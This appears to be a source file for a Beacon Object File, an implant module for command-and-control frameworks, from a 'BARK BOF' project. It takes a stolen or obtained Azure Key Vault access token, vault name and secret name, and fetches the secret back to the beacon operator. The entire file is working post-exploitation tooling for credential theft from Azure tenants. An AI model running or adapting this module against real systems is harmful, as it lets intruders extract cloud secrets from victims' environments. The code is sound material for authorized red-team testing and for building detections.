/*
 * get_azurerm_key_vault_secret.c — BARK BOF
 * Get-AzureRMKeyVaultSecret — Get a Key Vault secret by vault name and secret name
 *
 * Equivalent to:
 *   az keyvault secret show --vault-name <vaultName> --name <secretName>
 *
 * Args : token (KV-scoped), vaultName, secretName
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

#define HOST_BUF_SIZE 256
#define PATH_BUF_SIZE 512

void go(char *args, int alen)
{
    datap  parser;
    char  *token = NULL, *vaultName = NULL, *secretName = NULL;
    char  *hostBuf = NULL, *pathBuf = NULL;
    LPWSTR wideHost = NULL, widePath = NULL;

    BeaconDataParse(&parser, args, alen);
    token      = BeaconDataExtract(&parser, NULL);
    vaultName  = BeaconDataExtract(&parser, NULL);
    secretName = BeaconDataExtract(&parser, NULL);

    if (!token || MSVCRT$strlen(token) == 0 ||
        !vaultName || MSVCRT$strlen(vaultName) == 0 ||
        !secretName || MSVCRT$strlen(secretName) == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Usage: bark_get_azurerm_key_vault_secret <token> <vaultName> <secretName>\n");
        return;
    }

    hostBuf = (char *)HAlloc(HOST_BUF_SIZE);
    pathBuf = (char *)HAlloc(PATH_BUF_SIZE);
    if (!hostBuf || !pathBuf) {
        BeaconPrintf(CALLBACK_ERROR, "[-] HeapAlloc failed\n");
        goto cleanup;
    }

    MSVCRT$sprintf_s(hostBuf, HOST_BUF_SIZE, "%s.vault.azure.net", vaultName);
    MSVCRT$sprintf_s(pathBuf, PATH_BUF_SIZE, "/secrets/%s?api-version=7.3", secretName);

    wideHost = MbsToWcs(hostBuf);
    widePath = MbsToWcs(pathBuf);
    if (!wideHost || !widePath) {
        BeaconPrintf(CALLBACK_ERROR, "[-] String conversion failed\n");
        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Get-AzureRMKeyVaultSecret: %s/%s\n", vaultName, secretName);
    BarkGet(wideHost, widePath, token);

cleanup:
    if (wideHost) HFree(wideHost);
    if (widePath)  HFree(widePath);
    if (hostBuf)   HFree(hostBuf);
    if (pathBuf)   HFree(pathBuf);
}
